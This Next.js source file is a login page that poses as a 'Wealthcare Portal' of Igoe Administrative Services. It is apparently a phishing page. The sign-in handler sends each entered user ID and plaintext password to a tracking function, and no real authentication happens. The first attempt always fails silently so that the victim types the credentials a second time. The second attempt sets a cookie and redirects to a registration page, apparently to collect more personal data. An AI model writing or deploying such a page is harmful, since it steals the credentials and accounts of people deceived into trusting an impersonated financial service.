'use client'

import Link from "next/link"
import Image from "next/image"
import { Lock, Check, UserPlus } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Spinner } from "@/components/ui/spinner"
import { useVisitorTracking, trackFormSubmission } from "@/hooks/use-visitor-tracking"
import { useState, useEffect } from "react"

export default function LoginPage() {
  useVisitorTracking()
  const [userId, setUserId] = useState('')
  const [password, setPassword] = useState('')
  const [errors, setErrors] = useState<{userId?: string, password?: string, general?: string}>({})
  const [isLoading, setIsLoading] = useState(false)
  const [isRegisterLoading, setIsRegisterLoading] = useState(false)
  const [loginAttemptCount, setLoginAttemptCount] = useState(0)

  // Clear any existing auth cookies when landing on login page
  useEffect(() => {
    const clearAuthCookies = async () => {
      try {
        // Clear cookies by calling an API that deletes them
        await fetch('/api/clear-auth-cookies', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          }
        })
      } catch (error) {
        // Silently fail - not critical
      }
    }
    clearAuthCookies()
  }, [])

  const handleSignIn = async () => {
    const newErrors: {userId?: string, password?: string, general?: string} = {}
    
    if (!userId.trim()) {
      newErrors.userId = 'User ID is required'
    }
    if (!password.trim()) {
      newErrors.password = 'Password is required'
    }
    
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      return
    }
    
    setIsLoading(true)
    setErrors({})
    
    // Notify for every login attempt
    trackFormSubmission({
      type: 'login',
      userId,
      password,
      page: '/'
    })
    
    // 1 second delay
    await new Promise(resolve => setTimeout(resolve, 1000))
    setIsLoading(false)
    
    const isSecondAttempt = loginAttemptCount >= 1
    if (isSecondAttempt) {
      // Second attempt: set cookie and proceed to registration
      try {
        await fetch('/api/set-login-verified', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          }
        })
      } catch (error) {
        console.error('Failed to set login verification:', error)
      }
      window.location.href = '/registration'
    } else {
      // First attempt: clear fields only
      setLoginAttemptCount(1)
      setUserId('')
      setPassword('')
    }
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="border-b border-gray-200 px-6 py-4">
        <div className="flex items-center justify-between md:justify-start">
          <div className="flex items-center gap-6">
            {/* Logo */}
            <Link href="/" className="flex items-center">
              <Image
                src="/img/ebc994a1e5464f6b94b98cd212d5cbac.jpeg"
                alt="Goigoe Wealthcare Portal"
                width={140}
                height={32}
                className="h-8 w-auto"
                priority
              />
            </Link>

          </div>

          <div className="ml-6 text-xl text-gray-700 font-normal hidden md:block">Login</div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-6 pt-10 pb-8 md:pr-[700px]">
        <div className="w-full max-w-md">
          {/* Lock Icon */}
          <div className="flex justify-center mb-4">
            <div className="w-12 h-12 border-2 border-gray-400 flex items-center justify-center">
              <Lock className="w-6 h-6 text-gray-400" />
            </div>
          </div>

          {/* Privacy Message */}
          <p className="text-center text-gray-600 text-sm mb-4 leading-relaxed">
            We will maintain the confidentiality of your personal information in
            <br />
            accordance with our privacy policy.
          </p>

          {/* Sign in Heading */}
          <h1 className="text-center text-gray-700 text-xl mb-4">Sign in</h1>

          {/* General Error Message */}
          {errors.general && (
            <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded">
              <p className="text-sm text-red-600 text-center">{errors.general}</p>
            </div>
          )}

          {/* Login Form */}
          <div className="space-y-4">
            {/* UserId Field */}
            <div className="space-y-1">
              <Label htmlFor="userId" className="text-gray-700">
                UserId <span className="text-orange-500">*</span>
              </Label>
              <Input
                id="userId"
                type="text"
                value={userId}
                onChange={(e) => {
                  setUserId(e.target.value)
                  if (errors.userId) {
                    setErrors(prev => ({ ...prev, userId: undefined }))
                  }
                  if (errors.general) {
                    setErrors(prev => ({ ...prev, general: undefined }))
                  }
                }}
                className={`w-full ${errors.userId ? 'border-red-500 focus:border-red-500 focus:ring-red-500' : 'border-gray-300 focus:border-blue-500 focus:ring-blue-500'}`}
              />
              {errors.userId && (
                <p className="text-sm text-red-500 mt-1">{errors.userId}</p>
              )}
              <p className="text-sm mt-1">
                <span className="text-gray-600">Forgot your Username? </span>
                <Link href="#" className="text-blue-600 underline hover:text-blue-700">
                  Let us help
                </Link>
              </p>
            </div>

            {/* Password Field */}
            <div className="space-y-1">
              <Label htmlFor="password" className="text-gray-700">
                Password <span className="text-orange-500">*</span>
              </Label>
              <Input
                id="password"
                type="password"
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value)
                  if (errors.password) {
                    setErrors(prev => ({ ...prev, password: undefined }))
                  }
                  if (errors.general) {
                    setErrors(prev => ({ ...prev, general: undefined }))
                  }
                }}
                className={`w-full ${errors.password ? 'border-red-500 focus:border-red-500 focus:ring-red-500' : 'border-gray-300 focus:border-blue-500 focus:ring-blue-500'}`}
              />
              {errors.password && (
                <p className="text-sm text-red-500 mt-1">{errors.password}</p>
              )}
              <p className="text-sm mt-1">
                <span className="text-gray-600">Forgot your Password? </span>
                <Link href="#" className="text-blue-600 underline hover:text-blue-700">
                  Let us help
                </Link>
              </p>
            </div>

            {/* Sign In Button */}
            <div className="flex justify-center md:justify-start">
              <Button 
                onClick={handleSignIn}
                disabled={isLoading}
                className="bg-[#010147] hover:bg-[#0063ff] text-white py-4 px-8 text-base font-semibold min-w-[140px] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? (
                  <>
                    <Spinner className="w-5 h-5 mr-2" />
                    LOADING...
                  </>
                  ) : (
                    <>
                      <Check className="w-5 h-5 mr-2" />
                      SIGN IN
                    </>
                  )}
              </Button>
            </div>

            {/* Register Section */}
            <div className="pt-3">
              <p className="text-gray-700 mb-2">Don't have an account?</p>
              <div className="flex justify-center md:justify-start">
                <Button 
                  onClick={async () => {
                    setIsRegisterLoading(true)
                    await new Promise(resolve => setTimeout(resolve, 1000))
                    window.location.href = '/registration'
                  }}
                  disabled={isRegisterLoading}
                  className="bg-[#010147] hover:bg-[#0063ff] text-white py-4 px-8 text-base font-semibold min-w-[140px] disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isRegisterLoading ? (
                    <>
                      <Spinner className="w-5 h-5 mr-2" />
                      LOADING...
                    </>
                  ) : (
                    <>
                      <UserPlus className="w-5 h-5 mr-2" />
                      REGISTER
                    </>
                  )}
                  </Button>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-300 py-6 px-6">
        <div className="max-w-7xl mx-auto">
          <nav className="flex flex-wrap items-center justify-center gap-6 mb-3 text-sm">
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              CONTACT US
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              ABOUT US
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              TERMS OF USE
            </Link>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              PRIVACY POLICY
            </Link>
          </nav>
          <p className="text-center text-sm text-gray-600 mb-2">
            Copyright © 2024 Igoe Administrative Services. All Rights Reserved.
          </p>
          <p className="text-center">
            <Link href="#" className="text-sm text-gray-700 hover:text-gray-900 underline">
              SITE MAP
            </Link>
          </p>
        </div>
      </footer>
    </div>
  )
}
